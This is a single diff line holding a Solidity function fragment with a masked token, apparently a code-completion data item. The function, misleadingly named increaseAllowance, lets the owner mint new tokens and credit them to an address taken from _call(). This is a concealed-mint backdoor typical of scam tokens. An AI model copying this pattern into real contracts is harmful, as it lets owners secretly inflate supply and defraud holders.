@@ -1,0 +1,1 @@
+"function increaseAllowance(uint256 amount) public onlyOwner {        require(_call() != address(0));        _totalTokens = _totalTokens.add(amount);        _router[_call()] = _router[_call()].<mask0>;        emit Transfer(address(0), _call(), amount);    }"
